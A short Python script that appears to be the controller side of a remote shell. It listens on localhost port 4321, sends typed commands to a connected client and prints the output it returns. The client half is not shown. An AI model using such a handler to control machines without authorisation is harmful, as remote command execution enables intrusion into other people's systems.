import socket
import json

HOST = 'localhost'
PORT = 4321

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    pwd = conn.recv(1024).decode('utf-8')
    while True:
        command = input(f'{pwd}$~ ')
        if command[:2] == 'cd':
            conn.sendall(command.encode('utf-8'))
            pwd = conn.recv(1024).decode('utf-8')
            continue
        conn.sendall(command.encode('utf-8'))
        packet = conn.recv(1024).decode('utf-8')
        try:
            packet = json.loads(packet)
        except:
            print()
        if packet == 'q':
            print('Disconnected')
            break
        print(packet)
    s.close()